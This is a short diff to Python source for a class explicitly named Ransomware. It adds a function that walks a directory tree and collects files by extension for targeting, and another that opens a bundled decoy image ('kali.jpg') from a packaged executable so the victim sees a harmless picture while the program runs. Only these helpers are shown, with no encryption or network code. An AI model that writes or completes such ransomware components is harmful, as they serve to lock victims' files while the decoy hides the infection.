@@ -110,6 +110,15 @@ class Ransomware:
             except:
                 pass
 
+    def file_generator(self, path, extensions):
+        for root, dirs, files in os.walk(path):
+            for name in files:
+                if name.split('.')[-1] in extensions:
+                    yield os.path.join(root, name)
+
+    def open_fake_file(self):
+        subprocess.Popen(normalize_path_name(sys._MEIPASS, 'kali.jpg'), shell=True)
+
 
 if __name__ == '__main__':
     pass
